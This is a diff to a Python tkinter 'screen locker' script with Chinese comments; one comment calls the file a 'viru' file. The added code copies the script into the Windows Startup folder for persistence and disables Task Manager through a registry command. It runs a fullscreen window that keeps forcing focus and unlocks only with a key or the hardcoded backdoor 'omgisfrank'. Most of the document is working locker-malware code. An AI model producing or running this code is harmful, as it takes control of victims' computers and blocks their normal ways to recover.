@@ -1,12 +1,37 @@
 import tkinter as tk
 import random
 from PIL import Image, ImageTk
+import os
+import shutil
+# 取得目前這支程式的完整路徑
+current_file = os.path.abspath(__file__)
 
+# 取得 Windows 啟動資料夾的路徑
+startup_folder = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
+
+# 設定複製進去時的名稱 (可以改成 .pyw 沒黑框)
+target_file = os.path.join(startup_folder, "locker.pyw")
+
+# 把目前的檔案複製到啟動資料夾
+shutil.copy(current_file, target_file)
+#禁用工作管理員
+os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f')
+#自訂函式們------------------------------------------------
 def check_input():
     check=enter.get()
     if check==key:
+        os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f')#解禁
+            # 移除自啟動檔案
+        startup_path = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\locker.pyw")
+        if os.path.exists(startup_path):
+            os.remove(startup_path)
         root.destroy()
     elif check=="omgisfrank":
+        os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f')#解禁
+            # 移除自啟動檔案
+        startup_path = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\locker.pyw")
+        if os.path.exists(startup_path):
+            os.remove(startup_path)
         root.destroy()
     else:
         wrong=tk.Label(text="wrong key",bg="black", fg="red")
@@ -15,6 +40,14 @@ def check_input():
 root = tk.Tk()
 def clear_wrong_label(label):
     label.destroy()
+def destroy():
+    os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f')#解禁
+        # 移除自啟動檔案
+    startup_path = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\locker.pyw")
+    if os.path.exists(startup_path):
+        os.remove(startup_path)
+    root.destroy()
+#-----------------------------------------------------------
 root.title("Locker")
 root.geometry(f"{root.winfo_screenwidth()}x{root.winfo_screenheight()}+0+0")# 先設置全螢幕大小
 root.attributes('-fullscreen', True)  # 設為全屏
@@ -35,12 +68,18 @@ def force_focus():
     root.after(100, force_focus)  # 每100毫秒重複一次，防止焦點丟失
 force_focus()  # 啟動焦點強化
 # 建立close按鈕(測試時用 正式板時沒有)
-btn = tk.Button(root, text='close',command=root.destroy)
-#btn.place(x=100,y=500)# 加入視窗中
+btn = tk.Button(root, text='close',command=destroy)
+btn.place(x=100,y=500)# 加入視窗中
 btn.lift()
 #圖片
 # 讀取圖片
-img = Image.open("/home/zathan/桌面/screen locker/black-black-and-white-anonymous-hackers-wallpaper-preview.jpg")
+# 找到這支Python檔案（viru.py）所在的資料夾
+script_dir = os.path.dirname(os.path.abspath(__file__))
+# 在這個資料夾裡面，去找a.jpg
+img_path = os.path.join(script_dir, "a.jpg")
+# 打開圖片
+img = Image.open(img_path)
+#img = Image.open(r"C:\Users\Administrator\Downloads\screen-locker-main\a.jpg")
 
 # 取得螢幕解析度
 screen_width = root.winfo_screenwidth()
